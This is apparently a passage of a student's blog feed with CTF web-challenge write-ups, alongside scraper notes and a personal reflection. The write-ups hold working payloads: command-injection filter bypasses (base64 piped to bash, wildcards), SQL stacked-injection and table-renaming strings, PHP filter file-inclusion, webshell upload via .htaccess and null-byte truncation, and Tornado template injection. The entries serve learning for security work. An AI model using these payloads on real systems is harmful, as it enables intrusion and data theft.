        <content type="html"><![CDATA[<span id="more"></span><p>#前言</p><p>今天又是做不出来题目的一天</p><!--more--><p><img src="1.PNG"></p><p>POP链逆向分析</p><p><img src="2.png"></p><p><img src="3.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>henuctf</title>
      <link href="/2021/03/08/henuctf/"/>
      <url>/2021/03/08/henuctf/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>我知道我很菜，但昨天我意识到了我还不是一般的菜</p><span id="more"></span><h2>mai</h2><p>来看看菜鸡的做题思路，我下载<a href="http://www.zip之后/">www.zip之后</a></p><p><img src="1.PNG"></p><p>我前几天遇见过tostring()这个函数，我知道，当把类当作字符串输出的时候，会自动调用这个函数，如果结尾是echo(unserialize($_GET[‘henu’])),就可以直接输出key值，那么接下坐着就非常顺利，但是没有就卡在这里了，最最最关键的一步不会，就很难受，看wp果然是pop链，我当时做题，在查资料的时候在网上看到了pop链，aaaaa，还是没有耐心看完那么长的文章，现在来学习一下</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ping ping ping</title>
      <link href="/2021/03/07/ping/"/>
      <url>/2021/03/07/ping/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>感觉这道题做了2次，还是对某些命令不了解</p><p>下面就找了一位师傅的文章，系统的学习一下</p><h2>常见的管道符</h2><h3>windows</h3><li>|:直接执行后面的语句（必须保证前面是真）<li>||:如果前面是错的，就直接执行后面的语句，否则就前面<li>&：无论真假都执行<li>&&：如果前面是假，则两条都不执行，如果是真则执行两条(ps如果管道符被过滤可以尝试一下%0a,换行符绕过)<h3>linux</h3><p>多了一个；，跟&amp;一样</p><h2>空格过滤</h2><li>$IFS$9<li>${IFS}<LI>%09(需要php环境)<li>重定向符<>,<(这个尝试后好像不行，但是师傅做的可以（root@kali:~# cat<>flag<p>this is your flag )(有常识了一下，cat&lt;flag可以，但是cat&lt;flag.htm不行，现在试试cat f.php,cat flag是可以的，晚上回来了在研究研究)</p><h2>黑名单绕过</h2><h3>拼接</h3>a=c;b=at;c=fl;d=ag;$a$b $c$d<h3>base64编码</h3>\`echo Y2F0IGZsYWc=|base64 -d\`<p>echo Y2F0IGZsYWc=|base64 -d|bash</p><p>echo Y2F0IGZsYWc=|base64 -d|sh</p><h3>单引号和双引号</h3><p>c””at fl’’ag</p><h3>反斜线</h3><p>c\at fl\ag</p><h3>$1,$2等和$@</h3><p>c$1at f$@lag</p><h3>读文件绕过</h3><p>(1)more:一页一页的显示档案内容</p><p>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</p><p>(3)head:查看头几行</p><p>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p><p>(5)tail:查看尾几行</p><p>(6)nl：显示的时候，顺便输出行号</p><p>(7)od:以二进制的方式读取档案内容</p><p>(8)vi:一种编辑器，这个也可以查看</p><p>(9)vim:一种编辑器，这个也可以查看</p><p>(10)sort:可以查看</p><p>(11)uniq:可以查看</p><p>(12)file -f:报错出具体内容</p><h3>通配符绕过</h3><p>root@kali:~# /???/?[a][t] ?’’?’’?’’?’’</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>/bin/cat: test: 是一个目录</p><p>root@kali:~# /???/?at flag</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>root@kali:~# /???/?at ????</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>/bin/cat: test: 是一个目录</p><p>root@kali:~# /???/?[a]’’[t] ?’’?’’?’’?’’</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>/bin/cat: test: 是一个目录</p><h3>内敛执行绕过</h3>\`命令\`和$(命令)都是执行方式<p>echo “xx`pwd`“</p><p>echo “xx$(pwd)”</p><h3>绕过长度限制</h3><p>见原博客</p><h3>linux中命令换行</h3>在linux，但我们执行文件的时候，我们通过在没有写完的命令后面加\，可以将一条命令写多行root@kali:~# ca\<p>t\</p><p>fl\</p><p>ag</p><p>this is your flag</p><p>既然可以这样那我们是不是可以在某些限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行，尝试一下</p><p>root@kali:~# echo “ca\“&gt;cmd</p><p>root@kali:~# echo “t\“&gt;&gt;cmd</p><p>root@kali:~# echo “ fl\“&gt;&gt;cmd</p><p>root@kali:~# echo “ag”&gt;&gt;cmd</p><p>root@kali:~# cat cmd</p><p>ca\</p><p>t\</p><p> fl\</p><p>ag</p><p>root@kali:~# sh cmd</p><p>this is your flag</p><p>用这种方法可以绕过一些长度限制读取文件内容</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ssrf(简单的做一下)</title>
      <link href="/2021/03/07/ssrf-%E7%AE%80%E5%8D%95%E7%9A%84%E5%81%9A%E4%B8%80%E4%B8%8B/"/>
      <url>/2021/03/07/ssrf-%E7%AE%80%E5%8D%95%E7%9A%84%E5%81%9A%E4%B8%80%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.PNG"></p><p>这里面的几个函数，上个题目做的时候已经介绍过，整段代码就是输入url把这个界面的内容输出</p><p>我们输入<br>url=127.0.0.1,会发现它又把整端代码从新返回了一下</p><p>所以我们尝试输入127.0.0.1/flag.php,发现得到了flag</p><p><img src="2.PNG"></p><p>这点我们发现。它不能输入127.0.0.1.而且还要一http://</p><p>常见的绕过有<br>127.0.1，127.1，127。0.0.1,还有可以化为16进制或二进制</p><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">https://tool.520101.com/wangluo/jinzhizhuanhuan/</a></p><p>ip进制转换地址</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[2018]Fakebook</title>
      <link href="/2021/03/07/2018-Fakebook/"/>
      <url>/2021/03/07/2018-Fakebook/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>打开界面了解功能，有注册，登录页面，注册的时候，因为blog的格式一直未知，就一直不能注册成功，这时候想到进行扫描目录</p><p>扫出user.php.bak,下载源码</p><p><img src="1.PNG"></p><p>代码审计，有个ssrf的漏洞，这个url是我们自己控制的，有个关于blog的正则匹配，我们知道这个blog必须是以http（s）开头的</p><p>然后成功注册，点击注册信息，发现url有sql注入，多多关注url的变化，跟昨天做的那道题，注意url的变化</p><p>发现union select连在一起的时候会被过滤，但是如果是单独存在的时候就不会被过率。学到一个新姿势，如果union select连载一起的时候可以时候 union / * * /select进行绕过</p><p>然后进行报错注入</p><p><img src="2.PNG"></p><p>我们看到blog的地方，存在ssrf注入，并且我们可以看到/var/www/html/db.php，所以路径是/var/www/html/，所以我们在blog，填写上flag.php的信息便于读取</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:1:”2”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}</p><p>然后我们在url除进行注入?no=0 union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:1:”2”;s:3:”age”;i:0;s:4:”blog”;s:23:”file:///var/www/html/flag.php”;}’</p><p>只有完整的flag.php的名字才可以成功</p><p>另外我们再写先买呢的注入的时候，记得把？no=0,-1,不要写里面已经存在的数字</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nizhuansiwei</title>
      <link href="/2021/03/06/nizhuansiwei/"/>
      <url>/2021/03/06/nizhuansiwei/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>checkin</title>
      <link href="/2021/03/06/checkin/"/>
      <url>/2021/03/06/checkin/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>寒假做的，发现这道没写wp</p><p>就是挺简单的</p><p>有点，它说&lt;? in contents,我竟然没看懂这啥意思，用phtml就可以了</p><p>然后记录一下，我发现，我总是不知道在哪进行最后一步的连接</p><p>1.user.ini</p><p><a href="http://3fe77776-d4fa-4210-9999-ed8a8f74c9d3.node3.buuoj.cn/uploads/e320b013e12a70d708fbcd16e1e2c84c/index.php">http://3fe77776-d4fa-4210-9999-ed8a8f74c9d3.node3.buuoj.cn/uploads/e320b013e12a70d708fbcd16e1e2c84c/index.php</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cacl</title>
      <link href="/2021/03/06/cacl-1/"/>
      <url>/2021/03/06/cacl-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>have a bad day</title>
      <link href="/2021/03/06/day/"/>
      <url>/2021/03/06/day/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>注意，如果没有方法的时候，可以进行扫描目录，也可以对url进行仔细地观察</p><p>点击第一个图片？category=woofers，第二个是category=meowers，然后可以尝试一下?category=flag,显示Sorry, we currently only support woofers and meowers. ，所以只能在这两个身上做功夫</p><p>尝试?category=woofers’</p><p>Warning: include(woofers’.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</p><p>Warning: include(): Failed opening ‘woofers’.php’ for inclusion (include_path=’.:/usr/local/lib/php’) in /var/www/html/index.php on line 37</p><p>注意include，所以应该是文件包含，尝试伪协议读取，直接读flag。php不行，记得有一道题，是本来读取Flag，但是读不了，所以读取了index，所以尝试一下</p><?php                $file = $_GET['category'];                if(isset($file))                {                    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){                        include ($file . '.php');                    }                    else{                        echo "Sorry, we currently only support woofers and meowers.";                    }                }                ?><p>只是提示可以输入index，woofers，meowers</p><p>../?试试</p><p>对了这是在后面不加.php,注释符可以吗，没有用</p><p>%00虽然成功截断，但是会报错误</p><p>include 文件包含特性，尝试?category=woofers/../flag,发现f12说到，can you read this flag?，就是文件包含，这里是php；//filter<br>地一个小技巧，嵌套文件</p><p>?category=php://filter/read=convert.encode-base64/index|woofers|meowers/resource=flag,就是利用<code>php://filter伪协议可以套一层协议</code>进行读取</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>糗图百科python</title>
      <link href="/2021/03/05/%E7%B3%97%E5%9B%BE%E7%99%BE%E7%A7%91python/"/>
      <url>/2021/03/05/%E7%B3%97%E5%9B%BE%E7%99%BE%E7%A7%91python/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>veryphp</title>
      <link href="/2021/03/05/veryphp/"/>
      <url>/2021/03/05/veryphp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>题目源码</p><p><img src="1.jpg"></p><p>这道题我本来想的是str去调用类class，但是没法去掉，并且extract这个函数，以前做变量覆盖的时候遇见过，它是把输入的字符串变为数组，如果有已经存在的变量，就覆盖它的值，它并不具备命令执行的效果，所以str这里，对解答题目没有帮助</p><p>看shaw_root，它是一个正则匹配，如果匹配之路，则输入hint</p><p>/^-[a-e][^a-zA-Z0-8]&lt;b&gt;(.<em>)&gt;{4}\D</em>?(abc.*?)p(hp)*@R(s|r).$/‘</p><p>这里有一个正则匹配的网站</p><p><a href="https://regex101.com/">https://regex101.com/</a></p><p>来分析</p><p>^要以-开头，s或r结尾</p><p>【a-e】，可以输入a|b|c|d|e,最多匹配一次</p><p>【^a-zA-Z0-8】,匹配除了a-zA-Z0-8以外的，就是9</p><p>&lt;b&gt;输入&lt;b&gt;</p><p>(.*)匹配任意字符任意次</p><blockquote><p>{4}输入4个&gt;</p></blockquote><p>\D*?可有可无</p><p>(abc.*?)非贪婪模式，匹配一次，abc</p><p>p:p</p><p>(hp)*,匹配任意多次</p><p>@：@</p><p>（s|r）:s或r</p><p>因为还要控制当都是29：-a9&lt;b&gt;1&gt;&gt;&gt;&gt;abcphphphphphp@Rsr</p><p>还有很多<br>就是(.*)可控。(hp)*可控</p><p>还有因为过滤了<em>,所以我们输入不了show_root,但是，前一段时间做preg_match的时候，我们学到了一个知识在服务器中输入.|+|[|会被解析为</em>,所以我们输入show[root</p><p><img src="3.PNG"></p><p>就是发现，不是bp不好用就是post不好用，真的是无语了</p><p><img src="2.jpg"></p><p>看这里，在看这里</p><p><img src="3.jpg"></p><p>如果ans==Secretnumber，那么就是使用call_user_func这个函数</p><p>它可以在类外调用静态的方法</p><p>最后</p><p><img src="2.PNG"></p><p>听说下周要有个测试，突然特别紧张，虽然知道是一定要进行比赛的。</p><p>第一次，专业指导课的时候，参观了信息安全实验室，听学长介绍说，可以打攻防什么什么之类的，就感到十分感兴趣，就加了实验室的群。当听说要招新比赛的时候，我想不加了吧，因为我很懒，加实验室事情多，还要准备招新比赛，就不想加入。群里的消息没有看过，明知道有一场直播，也给自己找十分恰当的理由不去看。</p><p>招新比赛开始的那天，看群里说谁做了多少分的题，排名第几，当时我有点心动。第二天，我抱着一种心理，我问学长是不是比赛开始第二天就不能报名了，我想的是如果不能，我就给了我自己一个充分的理由不去加入。但是学长说可以。所以我就开始了，没有一点点准备</p><p>最开始的时候，我从未接触ctf，ctf是什么都不知道，最基本的做题思路都没有，完全就是瞎做，浪费了好长时间，也没做出来多少分。</p><p>我身上最大的一个缺点就是做一件事情不能全身心的投入，急于求成，往往啥也不是。招新的时候，总想着怎么把题目在网上搜出类似的进行模仿解答，却对知识了解的很少，那段时间很是不开心，第一次感到十分的挫败。做到2000多分的时候，想过放弃，但是坚持住了。</p><p>过了初试</p><p>寒假</p><p>这个假期过得还算充实，在假期里想要是没有加入实验室，我可能每天都在玩手机，无所事事，但现在我至少还有自己想要完成的东西</p><p>我逐渐慢慢的改变自己，先了解知识，后慢慢解答，学的多，忘记的也多，我现在能做出来一点简单的题目（绝大部分还是不能自己完成），能看懂简单的php代码，写一些python脚本，昨天，听完b站的爬虫视频，写了爬取网站图片的脚本，看着一张张下载下来的图片，突然感觉，原来我也是可以自己逼着自己去完成一项任务，不是别人布置的任务。</p><p>现在的我比之前的我进步了少许，不知道比赛那天的我是怎样的，不管加入与否，都很开心，很感谢自己这一段时间（虽然也没怎么进步）一直坚持，没有放弃。</p><p>同时，希望自己</p><p>不要急于求成，一道题目要仔细好好的反思，不管自己做出来与否，都要好好总结</p><p>另外专注于一道题，不要三心二意，一定啊</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>两个文件上传(你传你🐎呢，cgctf文件上传)</title>
      <link href="/2021/03/04/%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/03/04/%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>第一题</h2><p>就是一个利用.htaccess文件进行上传的题目，先上传.htaccess，后上传a.png，问题处在了哪里呢，是因为我，最后连接的url搞错了</p><p>/var/www/html/upload/d31b5eb9684c737c762a8c8d00d6c6df/a.png succesfully uploaded!</p><p>上传的路径是这样，所以我们构造的url应该是 url/upload/d31b5eb9684c737c762a8c8d00d6c6df/a.png</p><p>post连接，会出现报错，直接蚁剑连接</p><p>在复习下.htaccess，application/x-httpd-php，可以将所有文件都解析成php文件</p><h2>第二题</h2><p>题目地址（<a href="https://link.jianshu.com/?t=http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html%EF%BC%89">https://link.jianshu.com/?t=http%3A%2F%2Fteamxlc.sinaapp.com%2Fweb5%2F21232f297a57a5a743894a0e4a801fc3%2Findex.html）</a></p><h3>前置知识</h3><li>00截断原理<p>0x00是字符串结束的标志，我们手动添加这个标志来讲后面的内容截断，而后面的内容又可以帮我们绕过jiance</p><li>00截断的限制条件<p>php&lt;5.3.29,且GPC关闭</p><li>00截断的利用方法<p>上传文件的后端检测代码</p><p><img src="1.PNG"></p><li>用法<p>如果攻击者构造文件名：<code>admintony.php%00a.jpg</code>，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名会是.php，.php后缀又不允许上传所以上传失败了(这里有必要提一句，有人可能会说在一些情况下，%00截断文件名可以成功，这种案例你试一下是不是任意文件上传，西普的00截断实验就是一个任意文件上传的上传点，既然是任意文件上传又何必用00截断绕过呢？)</p><p>那么00截断应该在什么时候使用呢？数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在<code>path: uploads/</code>，那么攻击者可以通过修改path的值来构造<code>paylod: uploads/aa.php%00</code></p><p><img src="2.png"></p><p>疑问：</p><p>  为什么效果图中打印的结果和预期不符，是因为echo的特殊性质，官方解释的echo：</p><p>  <img src="3.png"></p><p>  正是因为echo可以输出多个字符串，一个字符串截断后就变成了两个字符串，所以会输出后面的内容。</p><h2>%00和%00(urldecode)</h2><p>在网上常见用Burp将数据包中的%00进行urldecode的操作，那为什么要进行这一个操作？网上也常见直接放入%00就可以截断成功的案例，为什么呢？</p><li>%00(urldecode)<p>首先解释为什么要进行urldecode操作呢？其原因在于上传的表单中有一个<code>enctype</code>的属性，并且需要<code>enctype=&quot;multipart/form-data&quot; </code>(不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。</p><li>%00  那么为什么网上也有直接添加%00而不进行urldecode操作呢？因为path也可以存放在`URL或者Cookie`中，而在提交数据的时候，浏览器会对数据做一次urldecode的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在非enctype=multipart/form-data的表单中或`URL or Cookie`中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行URL解码即可。<p><img src="4.png"></p><p>开始解题</p><p><img src="5.png"></p><p>上传png文件，bp抓包</p><p><img src="6.png"></p><p>明明不让上传。php文件，但是后缀话必须要php的，并且我们可以发现，相应包里面的数组，他把后缀名摘出来了</p><p>不让传php，却又php，只能进行%00截断</p><p><img src="7.PNG"></p><p>但是我们并没有成功，所以此时，就按照前置知识所说，我们可以看到请求头没有cookie，url也没有编码的现象，所以我们的path是存在表单中了，需要在数据包中进行urldecode操作使%00变成字符串结束符号。</p><p><img src="8.png">得到flag</p><p>还有是0x00截断</p><p>尝试</p><p><img src="9.PNG"></p><p>随便在/uoload/a.php写一个字符，占一个位置</p><p><img src="10.PNG"></p><p>修改hex，为00</p><p>得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>爬取国家药品管理监督总局中基于中华人民共和国化妆品生产许可证</title>
      <link href="/2021/03/04/%E7%88%AC%E5%8F%96%E5%9B%BD%E5%AE%B6%E8%8D%AF%E5%93%81%E7%AE%A1%E7%90%86%E7%9B%91%E7%9D%A3%E6%80%BB%E5%B1%80%E4%B8%AD%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%8C%96%E5%A6%86%E5%93%81%E7%94%9F%E4%BA%A7%E8%AE%B8%E5%8F%AF%E8%AF%81/"/>
      <url>/2021/03/04/%E7%88%AC%E5%8F%96%E5%9B%BD%E5%AE%B6%E8%8D%AF%E5%93%81%E7%AE%A1%E7%90%86%E7%9B%91%E7%9D%A3%E6%80%BB%E5%B1%80%E4%B8%AD%E5%9F%BA%E4%BA%8E%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%8C%96%E5%A6%86%E5%93%81%E7%94%9F%E4%BA%A7%E8%AE%B8%E5%8F%AF%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>url=’<a href="http://scxk.nmpa.gov.cn:81/xk/&#39;">http://scxk.nmpa.gov.cn:81/xk/&#39;</a></p><p>先看这个url可否获得我们想要的数据</p><p><img src="1.PNG"></p><p>可是结果里并没有我们想要的信息</p><p>所以我们想要的数据很有可能是动态加载出来的，所以考虑ajex请求，查看真正的url</p><p>可以看出<a href="http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList%EF%BC%8C%E6%98%AFpost%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF%E6%98%AF">http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList，是post请求，请求信息是</a></p><p>on=true&amp;page=1&amp;pageSize=15&amp;productName=&amp;conditionType=1&amp;applyname=&amp;applysn=</p><p><img src="2.PNG"></p><p>重新获得数据</p><p>里面那个list，值得注意</p><p>直接写完吧</p><p><img src="3.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯andGYCTF2020 Blacklist</title>
      <link href="/2021/03/03/Blacklist/"/>
      <url>/2021/03/03/Blacklist/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>强网杯</h2><p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p><p>输入1’ or 1=1 #可以列出所有的数据</p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) “1”<br><br>  [1]=&gt;<br><br>  string(7) “hahahah”<br><br>}<br></p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) “2”<br><br>  [1]=&gt;<br><br>  string(12) “miaomiaomiao”<br><br>}<br></p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(6) “114514”<br><br>  [1]=&gt;<br><br>  string(2) “ys”<br><br>}</p><p>(其实从这里看，是可以看出来，每一个数组中，第一个是字段名，第二个是字段内容，然后本题的解题思路就是送这里出来的，这应该是一个比较巧的方法，另一个方法在题目的最后详细说一下)</p><p>然后进行堆叠注入输入</p><p>1’;show tables;#</p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) “1”<br><br>  [1]=&gt;<br><br>  string(7) “hahahah”<br><br>}<br></p><p>array(1) {<br><br>  [0]=&gt;<br><br>  string(8) “FlagHere”<br><br>}<br><br><br>array(1) {<br><br>  [0]=&gt;<br><br>  string(5) “words”<br><br>}</p><p>查看FlagHere表</p><p>array(2) {<br><br>  [0]=&gt;<br><br>  string(1) “1”<br><br>  [1]=&gt;<br><br>  string(7) “hahahah”<br><br>}<br><br><br>array(6) {<br><br>  [0]=&gt;<br><br>  string(4) “flag”<br><br>  [1]=&gt;<br><br>  string(12) “varchar(100)”<br><br>  [2]=&gt;<br><br>  string(2) “NO”<br><br>  [3]=&gt;<br><br>  string(0) “”<br><br>  [4]=&gt;<br><br>  NULL<br><br>  [5]=&gt;<br><br>  string(0) “”<br><br>}</p><p>里面有用的是3列，string类型的，跟我们1’ or 1=1#出来的内容不大相似</p><p>然后查看一下words这个表</p><p>array(6) {<br><br>  [0]=&gt;<br><br>  string(2) “id”<br><br>  [1]=&gt;<br><br>  string(7) “int(10)”<br><br>  [2]=&gt;<br><br>  string(2) “NO”<br><br>  [3]=&gt;<br><br>  string(0) “”<br><br>  [4]=&gt;<br><br>  NULL<br><br>  [5]=&gt;<br><br>  string(0) “”<br><br>}</p><p>array(6) {<br><br>  [0]=&gt;<br><br>  string(4) “data”<br><br>  [1]=&gt;<br><br>  string(11) “varchar(20)”<br><br>  [2]=&gt;<br><br>  string(2) “NO”<br><br>  [3]=&gt;<br><br>  string(0) “”<br><br>  [4]=&gt;<br><br>  NULL<br><br>  [5]=&gt;<br><br>  string(0) “”</p><p>可以惊喜的发现，它第一个数组里面有一个id，然后第二个是data，所以此刻我们有理由怀疑，1’ or 1=1#的出来的数据就是words这个表里面的，那么我们能不能把words这个表改名成别的，然后再把FlagHere这个表改为words，然后再将data字段名概率论</p><p>尝试修改words的名字和字段data</p><p>alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</p><p>flag{a29fba37-6b85-4157-bd97-dd638d430d8b}</p><p>有一点，堆叠注入我不知道有要求还是啥，不一次性把语句写完，不一定能拿到flag。</p><h2>方法二 预处理，堆叠注入</h2>不使用变量<li>预定义sql语句  prepare name from '[my sql squece]';<li>执行预定义语句  execute name;<li >是删除预定义执行语句(deallocate||drop) prepare name;<p>预定义语句也可以通过表明进行传参</p><li>set @tn='hahaha';//存储表明<li>set @sql=concat('select * from',@tn);//存储sql语句<li>prepare name from @sql;//预定义sql语句<li>execute name;//执行预定义sql语句<li>(deallocate||drop) prepare name;//删除预定义语句<p>本题目因为过滤了select。所以用ascii对select进行编码char(115, 101, 108, 101, 99, 116)</p><p>使用无变量版：</p><p>1’;prepare name from concat(char(115, 101, 108, 101, 99, 116),’ * from `1919810931114514`‘);execute name;#</p><p>1’;prepare name from concat(‘selec’,’t’,’ * from `1919810931114514`‘);execute name;#<br>(concat是连接字符的，具体可参考sql1~10)</p><p>使用变量</p><p>1’;set @sqli=concat(char(115,101,108,101,99,116),’* from `1919810931114514`‘);prepare hacker from @sqli;execute hacker;#</p><p>报错了，说明有防御机制，这种方法不可行，strstr($inject, “set”) &amp;&amp; strstr($inject, “prepare”)</p><p>但是，这个时不会略大小写的，我们可以把set prepare转成大写</p><p>1’;SET @sqli=concat(char(115,101,108,101,99,116),’* from `1919810931114514`‘);PREPARE hacker from @sqli;EXECUTE hacker;#</p><p>OK</p><h2>GYCTF2020 Blacklist</h2><p>return preg_match(“/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i”,$inject);</p><p>这个把set prepare alter rename全都过滤了</p><p>所以这里引用一个新的方法handler</p><p>1’;handler FlagHere open;handler FlagHere read first;#</p><p>handler table_name open//打开一个句柄</p><p>handler table_name read firse//读第一行</p><p>handler table_name read next//都下一行</p><p>handler table_name close//关闭句柄</p><p>flag{d1ce3c20-07a8-43dc-a903-67509a8a5a43}得到</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easy_tornado</title>
      <link href="/2021/03/02/easy-tornado/"/>
      <url>/2021/03/02/easy-tornado/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>这一题</h2><p>前置知识</p><p>tornado render是python的渲染函数，如果用户对render的内容可控，不仅可以输入xss代码，而且话可以{}中间再来一个{}（如果直接那样正不能部署到git上面）进行传递变量和执行简单的表达式。</p><p><img src="3.PNG"> </p><p>当用户访登录的时候我们就得给他写cookie了,但是这里没有写在哪里写了呢?</p><p> 在哪里呢?之前写的Handler都是继承的RequestHandler,这次继承的是BaseHandler是自己写的Handler<br>  继承自己的类,在类了加扩展initialize! 在这里我们可以在这里做获取用户cookie或者写cookie都可以在这里做</p><p> 我们知道LoginHandler对象就是self,我们可不可以self.set_cookie()</p><p># self.set_cookie()<br>   # self.get_cookie()<br>   self.render(‘login.html’, **{‘status’: ‘’})</p><p>def login(request):</p><p>#获取用户输入<br> login_form = AccountForm.LoginForm(request.POST)</p><p> if request.method == ‘POST’:</p><p>#判断用户输入是否合法<br>   if login_form.is_valid():#如果用户输入是合法的<br>   username = request.POST.get(‘username’)<br>   password = request.POST.get(‘password’)</p><p>   if models.UserInfo.objects.get(username=username) and models.UserInfo.objects.get(username=username).password == password:</p><p>   request.session[‘auth_user’] = username</p><p>   return redirect(‘/index/‘)</p><p>   else:<br>   return render(request,’account/login.html’,{‘model’: login_form,’backend_autherror’:’用户名或密码错误’})</p><p>   else:<br>   error_msg = login_form.errors.as_data()</p><p>  return render(request,’account/login.html’,{‘model’: login_form,’errors’:error_msg})<br>   # 如果登录成功，写入session，跳转index</p><p>  return render(request, ‘account/login.html’, {‘model’: login_form}</p><p>由上面可知:render是一个类似模板的东西，可以使用不同的参数来访问网页<br>在tornado模板中，存在一些可以访问的快速对象，例如</p><pre><code>     &#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;</code></pre><p>这{}中间再来一个{}和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p><p>大概就是说，这里面就是我们一下环境变量，我们正是从这里获取的cookie_secret</p><p>得到<br>92a84b19-b7cb-4cb7-a474-c2c49c4873f4</p><p><img src="1.PNG"></p><p>脚本</p><p><img src="2.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>爬虫</title>
      <link href="/2021/03/01/%E7%88%AC%E8%99%AB/"/>
      <url>/2021/03/01/%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>1.搜狗</p><p><img src="3.PNG"></p><p>2.百度翻译</p><p><img src="2.PNG"></p><p>3.豆瓣</p><p><img src="1.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF，不过如此</title>
      <link href="/2021/03/01/%E6%AD%A4%E6%96%B9%E6%B3%95%E3%80%81%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
      <url>/2021/03/01/%E6%AD%A4%E6%96%B9%E6%B3%95%E3%80%81%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code>&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;))&#123;       echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;       if(preg_match(&quot;/flag/&quot;,$file))&#123;          die(&quot;Not now!&quot;);       &#125;       include($file);  //next.php&#125;else&#123;      highlight_file(__FILE__);&#125;?&gt;</code></pre><p>主要的问题在于我不知道file_get_contents($text,’r’)中的r是什么意思<br>我以为是read，然后我自己实验的是</p><pre><code>&lt;?php$text=&#39;I have a dream&#39;;print_r(file_get_contents($text,&#39;r&#39;));?&gt;</code></pre><p>但是报错了</p><p>在网上看到这种类型的解决方法，最后说一下</p><p>现在是得到了next.php的内容</p><pre><code>&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;    return preg_replace(       &#39;/(&#39; . $re . &#39;)/ei&#39;,       